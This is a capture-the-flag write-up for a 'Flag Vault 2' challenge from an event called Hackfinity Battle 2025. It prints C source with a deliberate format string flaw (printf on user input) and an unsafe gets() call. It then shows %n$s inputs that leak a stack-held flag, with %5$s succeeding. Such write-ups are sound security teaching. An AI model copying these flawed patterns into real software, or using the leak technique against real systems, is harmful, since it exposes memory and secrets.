# Flag Vault 2

##### Category: Format String Vulnerability

##### Difficulty: Easy

##### Event: Hackfinity Battle 2025 CTF Event

##### Solver: Simon

---

1. **Introduction**
   
   This challenge provides a compiled executable with its source code.

2. **Initial Analysis**
   
   ```c
   void print_flag(char *username){
           FILE *f = fopen("flag.txt","r");
           char flag[200];
   
           fgets(flag, 199, f);
           //printf("%s", flag);
   	
   	//The user needs to be mocked for thinking they could retrieve the flag
   	printf("Hello, ");
   	printf(username);
   	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
   	printf("Yours truly,\nByteReaper\n\n");
   }
   
   void login(){
   	char username[100] = "";
   
   	printf("Username: ");
   	gets(username);
   
   	// The flag isn't printed anymore. No need for authentication
   	print_flag(username);
   }
   
   void main(){
   	setvbuf(stdin, NULL, _IONBF, 0);
   	setvbuf(stdout, NULL, _IONBF, 0);
   	setvbuf(stderr, NULL, _IONBF, 0);
   
   	// Start login process
   	print_banner();
   	login();
   
   	return;
   }  
   ```

       We can see `printf(username)` without `%s`. We can read values from the stack        using `%n$s`, it's a format string leak.

3. **Finding The Flag**
   
   I strat enumerate until i find the stack value that contains the flag:
   
   `%1$s`, `%2$s`, `%3$s`, `%4$s`, `%5$s`.
   
   and for the 5th one:
   
   ```c
   Username: %5$s
   Hello, THM{format_issues}
   ```

4. **Conclusion**
   
   This works because the buffer `char flag[200]` is placed in `print_flag()` before the vulnerable `printf(username)` call, and it correspond to the 5th stack argument.
